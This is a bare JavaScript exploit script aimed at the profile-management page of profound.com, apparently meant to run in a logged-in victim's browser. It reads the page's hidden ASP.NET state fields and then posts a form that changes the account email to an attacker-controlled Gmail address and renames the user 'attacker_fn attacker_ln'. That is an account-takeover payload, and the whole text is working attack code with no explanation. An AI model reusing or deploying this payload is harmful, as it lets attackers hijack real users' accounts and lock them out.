fetch("https://www.profound.com/Pages/Subscriptions/ProfileManagement.aspx?view=Profile", {
  credentials: "include"
})
.then(response => response.text())
.then(html => {
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, "text/html");


    const viewstate = html.match(/id="__VIEWSTATE" value="([^"]+)"/)?.[1];
    const previousPage = html.match(/id="__PREVIOUSPAGE" value="([^"]+)"/)?.[1];
    const eventValidation = html.match(/id="__EVENTVALIDATION" value="([^"]+)"/)?.[1];

    const currentPhone = doc.querySelector("#BodyArea_MainContentArea_radPhone_text")?.value || "";
    const newEmail = "amir.gh852006+attacker1@gmail.com"; 

    const params = new URLSearchParams();

    params.append("__VIEWSTATE", viewstate);
    params.append("__PREVIOUSPAGE", previousPage);
    params.append("__EVENTVALIDATION", eventValidation);
    params.append("__EVENTTARGET", "");
    params.append("__EVENTARGUMENT", "");

    params.append("ctl00$ctl00$BodyArea$MainContentArea$HFOptionToShow", "AccountProfileContainer");
    params.append("ctl00$ctl00$BodyArea$MainContentArea$CreditCardUC$HFPMGatewayId", "");
    params.append("ctl00$ctl00$BodyArea$MainContentArea$CreditCardUC$hiddenPaymentKey", "");
    params.append("ctl00$ctl00$BodyArea$MainContentArea$AddressManagementUC$HFPrimaryAddressId", "79179");
    params.append("ctl00$ctl00$BodyArea$MainContentArea$AddressManagementUC$HFAddressId", "79179");
    params.append("ctl00$ctl00$BodyArea$MainContentArea$AddressManagementUC$AddressDataList$ctl00$AddressIdHiddenField", "79179");
    params.append("ctl00$ctl00$BodyArea$MainContentArea$AddressManagementUC$PrimaryAddressDataList$ctl00$PrimaryAddressIdHF", "79179");
    params.append("ctl00$ctl00$BodyArea$MainContentArea$AddressManagementUC$HFAddressType", "");


    params.append("BodyArea_MainContentArea_radEmailAddress_text", newEmail);
    params.append("ctl00$ctl00$BodyArea$MainContentArea$radEmailAddress", newEmail);
    params.append("BodyArea_MainContentArea_radEmailAddress_ClientState", "");

    params.append("BodyArea_MainContentArea_radPhone_text", currentPhone);
    params.append("ctl00$ctl00$BodyArea$MainContentArea$radPhone", currentPhone);
    params.append("BodyArea_MainContentArea_radPhone_ClientState", "");

    params.append("BodyArea_MainContentArea_radFirstName_text", "attacker_fn");
    params.append("ctl00$ctl00$BodyArea$MainContentArea$radFirstName", "attacker_fn");
    params.append("BodyArea_MainContentArea_radFirstName_ClientState", "");
    params.append("BodyArea_MainContentArea_radLastName_text", "attacker_ln");
    params.append("ctl00$ctl00$BodyArea$MainContentArea$radLastName", "attacker_ln");
    params.append("BodyArea_MainContentArea_radLastName_ClientState", "");

    params.append("ctl00$ctl00$BodyArea$MainContentArea$Country", "DE");
    params.append("ctl00$ctl00$BodyArea$MainContentArea$radJobFunctions", "22");


    params.append("RadOldPassword_text", "");
    params.append("ctl00$ctl00$BodyArea$MainContentArea$RadOldPassword", "");
    params.append("RadOldPassword_ClientState", "");
    params.append("RadNewPassword_text", "");
    params.append("ctl00$ctl00$BodyArea$MainContentArea$RadNewPassword", "");
    params.append("RadNewPassword_ClientState", "");
    params.append("RadRenteredPassword_text", "");
    params.append("ctl00$ctl00$BodyArea$MainContentArea$RadRenteredPassword", "");
    params.append("RadRenteredPassword_ClientState", "");

    params.append("ctl00$ctl00$BodyArea$MainContentArea$btnSave", "Save changes");

    fetch("https://www.profound.com/Pages/Subscriptions/ProfileManagement.aspx?view=Profile", {
        method: "POST",
        credentials: "include",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        body: params.toString()
    }).then(res => {
        if (res.ok) {
            alert("✅ Email updated to: " + newEmail);
        } else {
            alert("❌ Failed to update email (HTTP " + res.status + ")");
        }
    });
});
